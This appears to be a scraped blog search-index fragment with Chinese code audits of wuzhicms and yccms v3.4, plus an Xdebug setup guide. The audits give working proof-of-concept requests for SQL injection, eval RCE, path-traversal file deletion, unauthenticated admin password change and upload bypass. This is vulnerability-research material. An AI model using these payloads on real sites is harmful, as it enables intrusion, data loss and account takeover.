COREFRAME_ROOT.\u0026#39;core.php\u0026#39;; if(!isset($GLOBALS[\u0026#39;param\u0026#39;])) { exit(\u0026#39;{\u0026#34;info\u0026#34;:\u0026#34;验证失败\u0026#34;,\u0026#34;status\u0026#34;:\u0026#34;n\u0026#34;}\u0026#39;); } elseif($GLOBALS[\u0026#39;param\u0026#39;]==\u0026#39;\u0026#39;) { exit(\u0026#39;{\u0026#34;info\u0026#34;:\u0026#34;验证失败\u0026#34;,\u0026#34;status\u0026#34;:\u0026#34;n\u0026#34;}\u0026#39;); } $code = strip_tags($GLOBALS[\u0026#39;param\u0026#39;]); $posttime = SYS_TIME-300;//5分钟内有效 $db = load_class(\u0026#39;db\u0026#39;); $r = $db-\u0026gt;get_one(\u0026#39;sms_checkcode\u0026#39;,\u0026#34;`code`=\u0026#39;$code\u0026#39; AND `posttime`\u0026gt;$posttime\u0026#34;,\u0026#39;*\u0026#39;,0,\u0026#39;id DESC\u0026#39;); if($r) { exit(\u0026#39;{\u0026#34;info\u0026#34;:\u0026#34;验证通过\u0026#34;,\u0026#34;status\u0026#34;:\u0026#34;y\u0026#34;}\u0026#39;); } else { exit(\u0026#39;{\u0026#34;info\u0026#34;:\u0026#34;验证失败\u0026#34;,\u0026#34;status\u0026#34;:\u0026#34;n\u0026#34;}\u0026#39;); } api/sms_check.php?param=1%27%20or%20extractvalue(1,concat(0x7e,(select%20user())))%20\u0026ndash;+\n任意文件写入导致RCE 搜索file_put_contents() 函数,找到一处写入内容可控的地方。file_put_contents() 函数把一个字符串写入文件中。\ncoreframe/app/core/libs/function/common.func.php\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function set_cache($filename, $data, $dir = \u0026#39;_cache_\u0026#39;){ static $_dirs; if ($dir == \u0026#39;\u0026#39;) return FALSE; if (!preg_match(\u0026#39;/([a-z0-9_]+)/i\u0026#39;, $filename)) return FALSE; $cache_path = CACHE_ROOT . $dir . \u0026#39;/\u0026#39;; if (!isset($_dirs[$filename . $dir])) { if (!is_dir($cache_path)) { mkdir($cache_path, 0777, true); } $_dirs[$filename . $dir] = 1; } $filename = $cache_path . $filename . \u0026#39;.\u0026#39; . CACHE_EXT . \u0026#39;.php\u0026#39;; if (is_array($data)) { $data = \u0026#39;\u0026lt;?php\u0026#39; . \u0026#34;\\r\\n return \u0026#34; . array2string($data) . \u0026#39;?\u0026gt;\u0026#39;; } file_put_contents($filename, $data); } text\r1 index.php?m=attachment\u0026amp;f=index\u0026amp;_su=wuzhicms\u0026amp;v=ueditor\u0026amp;submit=1\u0026amp;setting=%3Cphp%20phpinfo();%3E 文章： 五指CMS 4.1.0存在CSRF漏洞可增加管理员账户\nhttps://wiki.timlzh.com/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/\nwuzhicms代码审计\nhttps://blog.csdn.net/RestoreJustice/article/details/129734772\n","permalink":"http://localhost:1313/xvsf/posts/wuzhicms/","summary":"\u003ch1 id=\"wuzhicms-代码审计\"\u003ewuzhicms 代码审计\u003c/h1\u003e\n\u003ch1 id=\"根目录分析\"\u003e根目录分析\u003c/h1\u003e\n\u003cp\u003eapi\t\t\t\t\tAPI接口，找未授权、SQL注入\ncaches\t\t\t 缓存目录\nconfigs\t\t\t配置文件\ncoreframe\t\t框架核心代码\ninstall\t\t\t\t安装目录，安装后应删除\nmap\t\t\t\t\npromote\nres\t\t\t\t\t静态资源\nuploadfile\t\t上传文件储存目录，文件上传漏洞\u003c/p\u003e","title":"wuzhicms 代码审计"},{"content":"yccms v3.4 代码审计 程序版本：\n从这个目录结构注意到这是一个MVC模式\n通读代码 admin index.php 后台入口\nrequire 引入文件 /config/run.inc.php 完成网站的初始化\n路由：GET /admin?a=\nceshi1\u0026amp;ceshi2\u0026amp;compile 都是一些页面模板\nconfig config.inc.php 数据库、Smarty以及其他的系统配置\ncount.php 通过计算根目录，加载 run.inc.php文件\nrun.inc.php 初始化文件、入口文件（进入后台会调用）\n功能：\n开启session，设置编码和时区\n引入配置文件和模板：config/config.inc.php\n​\t/public/smarty/Smarty.class.php\n自动加载类：__autoload()方法用于自动加载类\n​\tAction的类加载controller\n​\tModel的类加载model\n​\t其他的类加载public/class/\n单入口：Factory::setAction()-\u0026gt;run();调用控制器的run()，\n安全问题：入口文件的Factory给下面的RCE提供了入口点\n配置文件会有漏洞吗？配置文件会不会泄露数据库信息？\ncontrller Action.class.php 所有控制器的父类\n功能：\n定义属性 构造函数 分页、静态分页功能 控制器运行入口 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php //控制器基类 class Action {//声明Action类，属于所有控制器的父类 protected $_tpl = null;//定义属性 protected $_model = null;\tprotected function __construct() {//__construct() 构造函数，就是当对象被创建时，类中被自动调用的第一个函数，并且一个类中只能存在一个构造函数。但这里是protected，就不能在类的外部直接new这个类，只能在子类中通过继承使用。 $this-\u0026gt;_tpl = TPL::getInstance();//模板渲染 $this-\u0026gt;_model = Factory::setModel();//创建模型对象 Tool::setRequest(); //表单转义和html过滤\t可以防XSS、SQL } protected function page($_total,$_pagesize = PAGE_SIZE, $_model = null) {//定义了一个分页函数 $this-\u0026gt;_model = Validate::isNullString($_model) ? $this-\u0026gt;_model : $_model; $_page = new Page($_total,$_pagesize); $this-\u0026gt;_model-\u0026gt;setLimit($_page-\u0026gt;getLimit()); $this-\u0026gt;_tpl-\u0026gt;assign(\u0026#39;page\u0026#39;,$_page-\u0026gt;showpage()); $this-\u0026gt;_tpl-\u0026gt;assign(\u0026#39;num\u0026#39;,($_page-\u0026gt;getPage()-1)*$_pagesize); } //静态专用 protected function page2($_total,$_pagesize = PAGE_SIZE, $_model = null,$_url2=\u0026#39;\u0026#39;,$_fx=\u0026#39;\u0026#39;) {//另一种分页 $this-\u0026gt;_model = $_model; $_page = new Page($_total,$_pagesize,$_url2,$_fx); $this-\u0026gt;_model-\u0026gt;setLimit($_page-\u0026gt;getLimit()); $this-\u0026gt;_tpl-\u0026gt;assign(\u0026#39;page\u0026#39;,$_page-\u0026gt;listpage()); $this-\u0026gt;_tpl-\u0026gt;assign(\u0026#39;num\u0026#39;,($_page-\u0026gt;getPage()-1)*$_pagesize); } public function run() {//控制器运行入口 $_m = isset($_GET[\u0026#39;m\u0026#39;]) ? $_GET[\u0026#39;m\u0026#39;] : \u0026#39;index\u0026#39;;//url传参\u0026#39;?m=\u0026#39;,默认为index method_exists($this, $_m) ? eval(\u0026#39;$this-\u0026gt;\u0026#39;.$_m.\u0026#39;();\u0026#39;) : $this-\u0026gt;index();//eval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config/run.inc.php 这个文件，存在rce } } ?\u0026gt; AdminAction.class.php 管理员控制器\n功能：\n加载后台首页\n更改密码：使用sha1加密不安全\n系统信息显示：\n系统信息页：\n退出时清理缓存：删除 compile 目录文件\n路由：?a=admin\u0026amp;m=update -\u0026gt; 调用 update()\nArticleAction.class.php 文章控制器，\n功能：显示文章列表\n​\t提供搜索功能\n​\t增删修改文章\n​\tnav、attr（文章的修饰属性）等功能\nCallAction.class.php 功能： 验证码生成\n​\t后台文件上传\n​\t编辑器上传\nHtmlAction.class.php 生成静态控制器\n生成静态页面：\n首先调用模型，取出数据库内容，之后通过模板引擎渲染页面，输出HTML页面，然后使用工具类Tool::HtmlFile($filename, $content)，把HTML内容保存到指定路径，就可以在前端页面查看了。\n静态页面作用：\n直接访问.html文件，不需要调动数据库查询； 页面生成后不再执行动态代码，防止SQL注入； 当然，这种把内容提前准备好的方式，对于提升性能、减少算力、节约服务器资源、服务器更稳定等等有一定的优势。 本网站后台修改文章内容后需要静态生成，之后方可在首页显示。\n功能： 生成首页\n​\t生成文章\n​\t栏目列表\n​\t模板渲染\n​\t静态化输出\n​\t分步处理\nLinkAction.class.php 链接控制器\n功能：后台管理友情链接，修改链接、排序功能\nLoginAction.class.php 登录控制器\n功能：登录验证：sha1加密密码\n​\t验证码\n​\t记住密码\n​\tAJAX 验证\nNavAction.class.php 分类控制器\n功能：查看、排序、增删修改分类列表\nPicAction.class.php 图片控制器\n功能：\n后台图片展示：读取根目录中的uploads文件夹，但是没有过滤文件非法后缀，此处可能上传 .php 文件\n删除：没有检验图片路径，存在任意文件删除漏洞\n这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;?php //图片控制器 class PicAction extends Action{ public function __construct(){ parent::__construct(); } //这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除 public function index(){ $_dirPath=opendir(dirname(dirname(__FILE__)).\u0026#39;/uploads//\u0026#39;);//打开 /uploads/ 目录 $_dirName=\u0026#39;\u0026#39;;//保存图片名 $_picArr=array(); while(!!$_dirName=readdir($_dirPath)){//遍历 uploads 下的文件，此处无过滤 if($_dirName!=\u0026#39;.\u0026#39; \u0026amp;\u0026amp; $_dirName!=\u0026#39;..\u0026#39;){ $_picArr[] = $_dirName; } } krsort($_picArr);//逆序排列 $this-\u0026gt;_tpl-\u0026gt;assign(\u0026#39;picNum\u0026#39;,count(scandir(dirname(dirname(__FILE__)).\u0026#39;/uploads//\u0026#39;))-2);//获取上传的文件数 $this-\u0026gt;_tpl-\u0026gt;assign(\u0026#39;picArr\u0026#39;,$_picArr);//显示上传文件 $this-\u0026gt;_tpl-\u0026gt;display(\u0026#39;admin/public/picshow.tpl\u0026#39;); } public function delall(){//删除图片，依旧没有验证用户 if(isset($_POST[\u0026#39;send\u0026#39;])){ if(validate::isNullString($_POST[\u0026#39;pid\u0026#39;])) tool::layer_alert(\u0026#39;没有选择任何图片!\u0026#39;,\u0026#39;?a=pic\u0026#39;,7);//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 \u0026#39;?a=pic\u0026#39; $_fileDir=ROOT_PATH.\u0026#39;/uploads/\u0026#39;;//上传目录的跟路径 foreach($_POST[\u0026#39;pid\u0026#39;] as $_value){//遍历提交的图片名 $_filePath=$_fileDir.$_value;//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞 if(!unlink($_filePath)){//unlink() 删除文件 tool::layer_alert(\u0026#39;图片删除失败,请设权限为777!\u0026#39;,\u0026#39;?a=pic\u0026#39;,7); }else{ header(\u0026#39;Location:?a=pic\u0026#39;); } }\t}\t} } ?\u0026gt; SearchAction.class.php 搜索控制器\n功能：用于前端页面的内容搜索\nSystemAction.class.php 系统设置控制器\n功能：后台系统信息、设置首页文字内容\n记一些知识点、函数 PHP 中 private、public、protected区别\nPHP 之 Smarty 模板引擎使用汇总\nSmarty 是 PHP 的一个引擎模板，可以将 MVC 中的 C 分离出来。\nJavaScript之Ajax\nAJAX (Asynchronous JavaScript and XML) 异步 JS 和 XML，在不刷新整个页面的情况下，与服务器交换数据的技术。\nhtmlspecialchars() htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。\n预定义的字符是：\n\u0026amp; （和号）成为 \u0026amp; \u0026quot; （双引号）成为 \u0026quot; \u0026rsquo; （单引号）成为 ' \u0026lt; （小于）成为 \u0026lt; \u0026gt; （大于）成为 \u0026gt; 历史漏洞 YCCMS存在文件上传漏洞（CNVD-2021-47137）\nYCCMS存在文件上传漏洞（CNVD-2021-46794）\nYCCMS存在逻辑缺陷漏洞\nRCE漏洞复现 根据Action.class.php审计，发现method_exists($this, $_m) ? eval('$this-\u0026gt;'.$_m.'();') : $this-\u0026gt;index();\neval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config/run.inc.php 这个文件，存在rce\nPHP\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 //\tconfig/run.inc.php Factory::setAction()-\u0026gt;run(); -\u0026gt;setAction() //\tpublic/class/Factory.class.php class Factory{ ... static public function setAction(){ $_a=self::getA();//$_a 是get传参，可控变量 if (in_array($_a, array(\u0026#39;admin\u0026#39;, \u0026#39;nav\u0026#39;, \u0026#39;article\u0026#39;,\u0026#39;backup\u0026#39;,\u0026#39;html\u0026#39;,\u0026#39;link\u0026#39;,\u0026#39;pic\u0026#39;,\u0026#39;search\u0026#39;,\u0026#39;system\u0026#39;,\u0026#39;xml\u0026#39;,\u0026#39;online\u0026#39;))) { if (!isset($_SESSION[\u0026#39;admin\u0026#39;])) { header(\u0026#39;Location:\u0026#39;.\u0026#39;?a=login\u0026#39;); } } if (!file_exists(ROOT_PATH.\u0026#39;/controller/\u0026#39;.ucfirst($_a).\u0026#39;Action.class.php\u0026#39;)) $_a = \u0026#39;Login\u0026#39;;//ucfirst(), 将字符串首字母转化为大写，file_exists() 函数检查文件是否存在，如果文件不存在就回退为 Login 控制器 eval(\u0026#39;self::$_obj = new \u0026#39;.ucfirst($_a).\u0026#39;Action();\u0026#39;); return self::$_obj; } ... } 1、绕过 file_exists（）\n这个函数在进行检查时，比如/controller/admin;/../，函数允许路径中有一些特殊字符，并且遇到/../会返回到上级目录，可以利用这个绕过 file_exists（）函数检查。\n那么我们构造poc:Factory();phpinfo();//../\n2、入口点\n调用Factory() 的入口点在 Factory::setAction()-\u0026gt;run(); 这里，在admin/index.php 这个文件中得知，它包含了/config/run.inc.php，可以利用\n3、POC\n/admin?a=Factory();phpinfo();//../\n任意文件删除 根据审计PicAction.class.php时遇到的delall()函数，无验证造成的任意文件删除漏洞，进行复现。\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public function delall(){//删除图片，依旧没有验证用户 if(isset($_POST[\u0026#39;send\u0026#39;])){ if(validate::isNullString($_POST[\u0026#39;pid\u0026#39;])) tool::layer_alert(\u0026#39;没有选择任何图片!\u0026#39;,\u0026#39;?a=pic\u0026#39;,7);//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 \u0026#39;?a=pic\u0026#39; $_fileDir=ROOT_PATH.\u0026#39;/uploads/\u0026#39;;//上传目录的跟路径 foreach($_POST[\u0026#39;pid\u0026#39;] as $_value){//遍历提交的图片名 $_filePath=$_fileDir.$_value;//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞 if(!unlink($_filePath)){//unlink() 删除文件 tool::layer_alert(\u0026#39;图片删除失败,请设权限为777!\u0026#39;,\u0026#39;?a=pic\u0026#39;,7); }else{ header(\u0026#39;Location:?a=pic\u0026#39;); } } } } 来到对应的功能点：\n先给 upload 随便上传一张图片\n删除，进行抓包：\nURL编码：pid%5B0%5D=1.png\u0026amp;chkall=on\u0026amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87\n解码：\npid[0]=1.png\u0026amp;chkall=on\u0026amp;send=删除选中图片\nchkall=on是一个复选框\n可以看到只要在pid后的文件名进行路径拼接就可以跳到任意目录去删除文件\n接下来就可以根据上面的数据构造POC：\npid[0]=/../1.txt\u0026amp;chkall=on\u0026amp;send=删除选中图片\npid%5B0%5D=/../1.txt\u0026amp;chkall=on\u0026amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87\n路由：admin/?a=pic\u0026amp;m=delall\n在根目录准备一个1.txt\n退出登录\nPOST传参：\n上图的浏览器删不掉，换了一个成功了\n任意文章/文件（no）删除 这里想到审计ArticleAction.class.php时也有delall()函数，看看这里有没有文章删除漏洞。\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 //删除单个文章 public function delete(){ if(isset($_GET[\u0026#39;id\u0026#39;])){ $this-\u0026gt;_model-\u0026gt;id=$_GET[\u0026#39;id\u0026#39;]; $_findOne=$this-\u0026gt;_model-\u0026gt;findOne(); $html=$_findOne[0]-\u0026gt;html; if($html==NULL){ $html=\u0026#39;0.html\u0026#39;; } //先删除静态文件 if(tool::delete_file($html)){ if($this-\u0026gt;_model-\u0026gt;delete_article()){ Tool::alertLocation(null, tool::getPrevPage()); }else{ tool::layer_alert(\u0026#39;删除失败!\u0026#39;,\u0026#39;?a=article\u0026amp;m=index\u0026#39;,7); } } } } //删除多个文章 public function delall(){ if(isset($_POST[\u0026#39;send\u0026#39;])){ if(validate::isNullString($_POST[\u0026#39;showid\u0026#39;])) tool::layer_alert(\u0026#39;没有选择任何内容!\u0026#39;,\u0026#39;?a=article\u0026amp;m=index\u0026#39;,7); //$this-\u0026gt;_model-\u0026gt;id=implode(\u0026#39;,\u0026#39;,$_POST[\u0026#39;showid\u0026#39;]); //echo $this-\u0026gt;_model-\u0026gt;id; foreach ($_POST[\u0026#39;showid\u0026#39;] as $_value){ $this-\u0026gt;_model-\u0026gt;id=$_value; $_findOne=$this-\u0026gt;_model-\u0026gt;findOne(); $html=$_findOne[0]-\u0026gt;html; if($html==NULL){ $html=\u0026#39;0.html\u0026#39;;\t} //先删除静态文件 if(file_exists(ROOT_PATH.\u0026#39;/\u0026#39;.$html)){ if(!unlink(ROOT_PATH.\u0026#39;/\u0026#39;.$html)){ tool::layer_alert(\u0026#39;静态文件删除失败,请设权限为777!\u0026#39;,\u0026#39;?a=article\u0026amp;m=index\u0026#39;,5); } } $this-\u0026gt;_model-\u0026gt;delete_article(); header(\u0026#39;Location:\u0026#39;.tool::getPrevPage()); } } } delete() GET传参，\n找到一篇文章的id\n构造POC：admin/?a=article\u0026amp;m=delete\u0026amp;id=2450\n执行后发现这篇文章被删除了\ndelall() 功能点：此处多选删除\n抓包：\nshowid%5B%5D=2449\u0026amp;showid%5B%5D=2448\u0026amp;showid%5B%5D=2447\u0026amp;showid%5B%5D=2446\u0026amp;chkall=on\u0026amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4\n同样的，构造POC：\nshowid%5B%5D=%2F..%2F1.txt\u0026amp;showid%5B%5D=2448\u0026amp;showid%5B%5D=2447\u0026amp;showid%5B%5D=2446\u0026amp;chkall=on\u0026amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4\n路由：admin/?a=article\u0026amp;m=delall\n但是只删除了文章并没有删除1.txt ？？\n再认真分析一遍：\nphp\r1 2 3 4 foreach ($_POST[\u0026#39;showid\u0026#39;] as $_value){ $this-\u0026gt;_model-\u0026gt;id=$_value;//获取文章id $_findOne=$this-\u0026gt;_model-\u0026gt;findOne();//数据库查询 $html=$_findOne[0]-\u0026gt;html;//从数据库中获取 HTML 直接传递/../1.txt作为ID值，系统会将/../1.txt当作文章ID去数据库查询，显然这个ID不存在\n想要利用这里的漏洞，只能去更改数据库中HTML的内容，\n添加、修改、删除都进行了用户验证，所以这个也不算一个漏洞了。\nphp\r1 2 3 $this-\u0026gt;_tpl-\u0026gt;assign(\u0026#39;admin\u0026#39;, $_SESSION[\u0026#39;admin\u0026#39;]); $html=$_SESSION[\u0026#39;html_temp\u0026#39;]; $_SESSION[\u0026#39;html_temp\u0026#39;]=$_art[0]-\u0026gt;html; 任意文件上传 controller/CallAction.class.php\nPHP\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 //处理上传图片 public function upLoad() { if (isset($_POST[\u0026#39;send\u0026#39;])) { $_logoupload = new LogoUpload(\u0026#39;pic\u0026#39;,$_POST[\u0026#39;MAX_FILE_SIZE\u0026#39;]); $_path = $_logoupload-\u0026gt;getPath(); $_img = new Image($_path); $_img-\u0026gt;xhImg(960,0); $_img-\u0026gt;out(); //echo $_path; $_logoupload-\u0026gt;alertOpenerClose(\u0026#39;图片上传成功！\u0026#39;,\u0026#39;..\u0026#39;.$_path); } else { exit(\u0026#39;警告：文件过大或者其他未知错误导致浏览器崩溃！\u0026#39;); } } php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 //构造方法，初始化 public function __construct($_file,$_maxsize) { $this-\u0026gt;error = $_FILES[$_file][\u0026#39;error\u0026#39;]; $this-\u0026gt;maxsize = $_maxsize / 1024; $this-\u0026gt;type = $_FILES[$_file][\u0026#39;type\u0026#39;]; $this-\u0026gt;path = ROOT_PATH.\u0026#39;/\u0026#39;.UPLOGO; $this-\u0026gt;name = $_FILES[$_file][\u0026#39;name\u0026#39;]; $this-\u0026gt;tmp = $_FILES[$_file][\u0026#39;tmp_name\u0026#39;]; $this-\u0026gt;checkError(); $this-\u0026gt;checkType(); $this-\u0026gt;checkPath(); $this-\u0026gt;moveUpload(); } 根据Content-Type的值来判断是否是图片格式，只要Content-Type是这两种类型就可以，那直接伪造Content-Type就可以了\n任意文件上传-2 controller/CallAction.class.php\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //xheditor编辑器专用上传 public function xhUp() { if (isset($_GET[\u0026#39;type\u0026#39;])) { $_fileupload = new FileUpload(\u0026#39;filedata\u0026#39;,10); $_err=$_fileupload-\u0026gt;checkError(); $_path = $_fileupload-\u0026gt;getPath(); $_msg=\u0026#34;\u0026#39;..$_path\u0026#39;\u0026#34;; $_img = new Image($_path); $_img-\u0026gt;xhImg(650,0); $_img-\u0026gt;out(); echo \u0026#34;{\u0026#39;err\u0026#39;:\u0026#39;\u0026#34;.$_err.\u0026#34;\u0026#39;,\u0026#39;msg\u0026#39;:\u0026#34;.$_msg.\u0026#34;}\u0026#34;; exit(); } else { Tool::alertBack(\u0026#39;警告：由于非法操作导致上传失败！\u0026#39;); } } 代码中的文件名以时间+100到1000之间的随机数进行重命名\n同样也是检查的传入的Content-Type的值\n未授权更改管理员账号密码 首先来看一下漏洞利用过程，在未登录的情况下构造url,只需要更改username password notpassword的值即可更改数据库中admin账号的相关信息\n根据url来定位一下漏洞函数，函数位于controller\\AdminAction.class.php中的update函数\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public function update(){ if(isset($_POST[\u0026#39;send\u0026#39;])){ if(validate::isNullString($_POST[\u0026#39;username\u0026#39;])) Tool::t_back(\u0026#39;用户名不能为空\u0026#39;,\u0026#39;?a=admin\u0026amp;m=update\u0026#39;); if(validate::isNullString($_POST[\u0026#39;password\u0026#39;])) Tool::t_back(\u0026#39;密码不能为空!\u0026#39;,\u0026#39;?a=admin\u0026amp;m=update\u0026#39;); if(!(validate::checkStrEquals($_POST[\u0026#39;password\u0026#39;], $_POST[\u0026#39;notpassword\u0026#39;]))) Tool::t_back(\u0026#39;两次密码不一致!\u0026#39;,\u0026#39;?a=admin\u0026amp;m=update\u0026#39;); $this-\u0026gt;_model-\u0026gt;username=$_POST[\u0026#39;username\u0026#39;]; $this-\u0026gt;_model-\u0026gt;password=sha1($_POST[\u0026#39;password\u0026#39;]); $_edit=$this-\u0026gt;_model-\u0026gt;editAdmin(); if($_edit){ tool::layer_alert(\u0026#39;密码修改成功!\u0026#39;,\u0026#39;?a=admin\u0026amp;m=update\u0026#39;,6); }else{ tool::layer_alert(\u0026#39;密码未修改!\u0026#39;,\u0026#39;?a=admin\u0026amp;m=update\u0026#39;,6); } } $this-\u0026gt;_tpl-\u0026gt;assign(\u0026#39;admin\u0026#39;, $_SESSION[\u0026#39;admin\u0026#39;]); $this-\u0026gt;_tpl-\u0026gt;display(\u0026#39;admin/public/update.tpl\u0026#39;); } 可以看到前面都是一些判断，重点关注下editAdmin()函数，该函数位于model\\AdminModel.class.php\nphp\r1 2 3 4 5 6 7 8 9 10 11 public function editAdmin(){ $_sql=\u0026#34;UPDATE my_admin SET username=\u0026#39;$this-\u0026gt;username\u0026#39;, password=\u0026#39;$this-\u0026gt;password\u0026#39; WHERE id=1 LIMIT 1\u0026#34;; return parent::update($_sql); } 该函数的父类为Model, 位于model\\Model.class.php，看一下update函数\nphp\r1 2 3 protected function update($_sql){ return $this-\u0026gt;execute($_sql)-\u0026gt;rowCount(); } 调用execute函数去执行sql语句\nphp\r1 2 3 4 5 6 7 8 9 10 protected function execute($_sql){ try{ $_stmt=$this-\u0026gt;_db-\u0026gt;prepare($_sql); $_stmt-\u0026gt;execute(); }catch (PDOException $e){ exit(\u0026#39;SQL语句:\u0026#39;.$_sql.\u0026#39;\u0026lt;br /\u0026gt;错误信息:\u0026#39;.$e-\u0026gt;getMessage()); } return $_stmt; } } 这一系列的操作主要是用来生成SQL语句然后执行SQL语句，editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id=1的数据，这也就造成了任意更改管理员账号密码\n","permalink":"http://localhost:1313/xvsf/posts/yccms-v3.4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","summary":"\u003ch1 id=\"yccms-v34-代码审计\"\u003eyccms v3.4 代码审计\u003c/h1\u003e\n\u003cp\u003e程序版本：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"20250708090010810\" decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948854.png\" style=\"max-width: 100%; height: auto;\"\u003e\u003c/p\u003e\n\u003cp\u003e从这个目录结构注意到这是一个MVC模式\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"20250708135815537\" decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948086.png\" style=\"max-width: 100%; height: auto;\"\u003e\u003c/p\u003e\n\u003ch2 id=\"通读代码\"\u003e通读代码\u003c/h2\u003e\n\u003ch3 id=\"admin\"\u003eadmin\u003c/h3\u003e\n\u003ch4 id=\"indexphp\"\u003eindex.php\u003c/h4\u003e\n\u003cp\u003e后台入口\u003c/p\u003e\n\u003cp\u003erequire  引入文件  /config/run.inc.php 完成网站的初始化\u003c/p\u003e\n\u003cp\u003e路由：GET   /admin?a=\u003c/p\u003e\n\u003ch3 id=\"ceshi1ceshi2compile\"\u003eceshi1\u0026amp;ceshi2\u0026amp;compile\u003c/h3\u003e\n\u003cp\u003e都是一些页面模板\u003c/p\u003e","title":"yccms v3.4 代码审计"},{"content":"PHP storm 配置 XDebug 在小皮面板找到对应版本，打开XDebug组件\nphp.ini配置：（配置完成后重启服务）\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 [Xdebug] zend_extension=D:/CTF-Tools/phpstudy_pro/Extensions/php/php5.5.9nts/ext/php_xdebug.dll xdebug.collect_params=1 xdebug.collect_return=1 xdebug.auto_trace=Off xdebug.trace_output_dir=D:/CTF-Tools/phpstudy_pro/Extensions/php_log/php5.5.9nts.xdebug.trace xdebug.profiler_enable=Off xdebug.profiler_output_dir=\u0026#34;D:\\CTF-Tools\\phpstudy_pro\\Extensions\\tmp\\xdebug\u0026#34; xdebug.remote_enable=On xdebug.remote_host=localhost xdebug.remote_port=9100 xdebug.remote_handler=dbgp xdebug.mode=debug xdebug.idekey = PHPSTORM xdebug.remote_enable=On 接下来打开PHP storm设置：\n-\u0026gt;PHP\u0026gt;调试\u0026gt;DBGp代理\nIDE 键：PHPSTORM\txdebug.idekey = PHPSTORM\n主机：localhost\txdebug.remote_host=localhost\n端口：9001\txdebug.remote_port=9100\n将端口对应 xdebug.remote_port=9100 php.ini 配置为 9100\n-\u0026gt;PHP\u0026gt;服务器\n名称：yccms （随意）\n主机：localhost\txdebug.remote_host=localhost\n端口：80 （保持默认 80 即可）\n调试器：Xdebug\n使用路径映射 运行一个新的 PHP web 配置\n服务器：yccms\t（选择上一步配置好的服务器）\n起始URL: http://localhost:7676 （此处的端口对应上 xp 搭建网站时的端口）\n验证一下：\n除了下面的三个黄标，其他没有问题就可以正常使用调试了\n","permalink":"http://localhost:1313/xvsf/posts/php-storm-%E9%85%8D%E7%BD%AE-xdebug/","summary":"\u003ch1 id=\"php-storm-配置-xdebug\"\u003ePHP storm 配置 XDebug\u003c/h1\u003e\n\u003cp\u003e在小皮面板找到对应版本，打开XDebug组件\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"20250708133948343\" decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957606.png\" style=\"max-width: 100%; height: auto;\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ephp.ini配置：（配置完成后重启服务）\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"20250708134137512\" decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957876.png\" style=\"max-width: 100%; height: auto;\"\u003e\u003c/p\u003e\n\u003cdiv class=\"code-block-container\" data-expanded=\"true\"\u003e\r\n    \u003cdiv class=\"code-header\"\u003e\r\n        \u003cdiv class=\"mac-buttons\"\u003e\r\n            \u003cspan class=\"mac-button red\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button yellow\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button green\"\u003e\u003c/span\u003e\r\n        \u003c/div\u003e\r\n        \u003cspan class=\"code-language\"\u003etext\u003c/span\u003e\r\n        \u003cdiv class=\"code-actions\"\u003e\r\n            \u003cbutton class=\"copy-btn\" title=\"Copy\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"\u003e\u003crect x=\"9\" y=\"9\" width=\"13\" height=\"13\" 